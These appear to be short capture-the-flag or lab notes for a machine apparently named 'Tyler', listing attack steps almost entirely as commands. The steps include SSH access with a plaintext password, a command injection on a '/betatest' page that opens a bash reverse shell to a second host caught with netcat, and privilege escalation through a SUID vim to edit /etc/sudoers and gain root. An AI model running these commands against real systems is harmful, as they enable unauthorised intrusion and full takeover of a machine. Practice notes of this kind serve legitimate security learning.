Tyler

`ssh narrator@IP` password `X8JEETQmf3hkS65f` (don't ask me where this comes from, I extracted it from the ~~deep dark~~ web)

`vim /etc/sudoers`
add the line `narrator   ALL=(ALL)	ALL` to the file next to where the root one is

`sudo su`
you are in! `chmod 0755 /usr/bin/vim`



http://ip/betatest
`test; bash -i >& /dev/tcp/IP2/8080 0>&1` after `nc -nlvp 8080`

- Use SSH to get full shell
VIM SUID to root: `vim /etc/sudoers`